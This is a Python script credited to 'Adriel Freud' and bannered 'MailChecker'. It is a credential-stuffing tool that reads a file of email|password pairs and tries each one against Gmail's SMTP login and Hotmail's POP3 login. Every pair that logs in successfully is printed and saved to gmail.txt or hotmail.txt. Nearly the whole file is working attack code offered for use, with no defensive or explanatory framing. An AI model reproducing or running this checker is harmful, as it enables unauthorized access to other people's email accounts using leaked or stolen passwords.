#/usr/bin/python

# Desenvolvido por Adriel Freud!
# Contato: businessc0rp2k17@gmail.com
# FB: http://www.facebook.com/xrn401
#   =>DebutySecTeamSecurity<=
#conding: utf-8

import os, sys
import smtplib, poplib

menu = """
 __  __       _ _  _____ _               _             
|  \/  |     (_) |/ ____| |             | |            
| \  / | __ _ _| | |    | |__   ___  ___| | _____ _ __ 
| |\/| |/ _` | | | |    | '_ \ / _ \/ __| |/ / _ \ '__|
| |  | | (_| | | | |____| | | |  __/ (__|   <  __/ |   
|_|  |_|\__,_|_|_|\_____|_| |_|\___|\___|_|\_\___|_|   
                                                       
Powered By Adriel Freud\n\n"""

def connect_Gmail(email, password):
	smtp = smtplib.SMTP("smtp.gmail.com", 587) 
	resp = smtp.starttls()
	if resp[0] == 220:
		try:
			log = smtp.login(email, password)
			if log[0] == 235:
				smtp.quit()
				print("[=>] Login Sucessfull!")
				print("[ Login: %s | Pass: %s ]"%(email, password))
				gmail_com.write("[ Login: %s | Pass: %s ]\n"%(email, password))
		except:
			smtp.quit()
	else:
		smtp.quit()
		print("[==>] Error ao tentar conexao TLS!\n")

def connect_Hotmail(email, password):
	Connect = poplib.POP3_SSL('pop3.live.com', 995)
	try:
		Connect.user(email)
		pwdmsng = Connect.pass_(password)

		if pwdmsng[0:3] == '+OK':
			print("[=>] Login Sucessfull!")
			print("[ Login: %s | Pass: %s ]"%(email, password))
			live_com.write("[ Login: %s | Pass: %s ]\n"%(email, password))
			Connect.quit()
		else:
			pass
	except:
		Connect.quit()

if len(sys.argv) < 2:
	print(menu)
	print("\n[==>] How to Use: root@localhost:~# python checker.py emails_to_open.txt hotmail")
	print("\t\t\t\t\t\t[hotmail or gmail]")

else:
	print(menu)
	emails = open(sys.argv[1], "r")
	linhas = emails.readlines()

	gmail_com = open("gmail.txt", "w")
	live_com = open("hotmail.txt", "w")

	for e in linhas:
		email = e.split("|")

		if 'gmail' in sys.argv[2]:
			connect_Gmail(email[0].strip('\n'), email[1].strip('\n'))

		elif 'hotmail' in sys.argv[2]:
			connect_Hotmail(email[0].strip('\n'), email[1].strip('\n'))

		else:
			print("[!!] Error to init Thread!\n To be Try :)")
		
	gmail_com.close()
	live_com.close()

